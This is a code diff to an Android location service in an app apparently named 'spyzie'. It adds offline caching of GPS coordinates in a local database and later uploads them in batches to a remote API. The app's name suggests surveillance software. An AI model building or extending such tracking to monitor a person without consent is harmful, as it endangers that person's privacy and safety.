@@ -21,10 +21,14 @@ import com.google.android.gms.location.LocationResult;
 import com.google.android.gms.location.LocationServices;
 import com.tantd.spyzie.R;
 import com.tantd.spyzie.SpyzieApplication;
+import com.tantd.spyzie.data.db.DbManager;
 import com.tantd.spyzie.data.model.Error;
 import com.tantd.spyzie.data.network.ApiManager;
 import com.tantd.spyzie.util.CommonUtils;
 import com.tantd.spyzie.util.Constants;
+import com.tantd.spyzie.util.NetworkUtils;
+
+import java.util.List;
 
 import javax.inject.Inject;
 
@@ -32,6 +36,8 @@ public class LocationService extends JobIntentService {
 
     @Inject
     ApiManager mApiManager;
+    @Inject
+    DbManager mDbManager;
 
     private static final String CHANNEL_ID = "ForegroundServiceChannel";
     private static final String DEBUG_SUB_TAG = "[" + LocationService.class.getSimpleName() + "] ";
@@ -47,6 +53,8 @@ public class LocationService extends JobIntentService {
     private LocationCallback mLocationCallback;
 
     private boolean isUpdatingLocation;
+
+    private com.tantd.spyzie.data.model.Location lastUpdatedLocation;
 
     public static void enqueueWork(Context context, Intent intent) {
         enqueueWork(context, LocationService.class, JOB_ID, intent);
@@ -138,11 +146,34 @@ public class LocationService extends JobIntentService {
             public void onLocationResult(LocationResult locationResult) {
                 Location location = locationResult.getLastLocation();
                 if (location != null) {
-                    mApiManager.sendLocationData(new com.tantd.spyzie.data.model.Location(location.getLatitude(),
+                    proceedLocationData(new com.tantd.spyzie.data.model.Location(location.getLatitude(),
                             location.getLongitude()));
                 }
             }
         };
+    }
+
+    private void proceedLocationData(com.tantd.spyzie.data.model.Location location) {
+        if (Constants.IS_DEBUG_MODE) {
+            Log.d(Constants.LOG_TAG + "A", DEBUG_SUB_TAG + "proceedLocationData, location=" + location
+            + ", last=" + lastUpdatedLocation);
+        }
+        if (!location.isSameValueWith(lastUpdatedLocation)) {
+            lastUpdatedLocation = location;
+            if (NetworkUtils.isNetworkConnected(this)) {
+                List<com.tantd.spyzie.data.model.Location> savedData =
+                        (List<com.tantd.spyzie.data.model.Location>) mDbManager.find(com.tantd.spyzie.data.model.Location.class
+                                , 0, Constants.MAX_READ_DATA_ENTRIES);
+                savedData.add(location);
+                mApiManager.sendLocationData(savedData);
+                savedData.remove(savedData.size() - 1);
+                if (savedData.size() > 0) {
+                    mDbManager.removeLocations(savedData);
+                }
+            } else {
+                mDbManager.put(location);
+            }
+        }
     }
 
     @Override
